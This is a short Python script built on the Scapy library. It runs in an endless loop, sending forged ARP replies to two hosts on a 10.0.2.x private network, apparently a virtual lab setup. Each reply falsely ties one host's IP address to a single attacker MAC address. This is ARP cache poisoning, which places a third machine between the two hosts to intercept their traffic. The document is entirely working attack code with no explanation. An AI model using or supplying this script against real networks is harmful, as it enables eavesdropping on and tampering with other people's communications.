from scapy.all import *
while(1):
    E = Ether()
    A = ARP()
    A.hwsrc= "08:00:27:72:07:7d"
    A.psrc = "10.0.2.15"
    A.pdst = "10.0.2.6"
    pkt = E/A
    A.psrc = "10.0.2.6"
    A.pdst = "10.0.2.15"
    pkt1 = E/A
    
    sendp(pkt)
    sendp(pkt1)
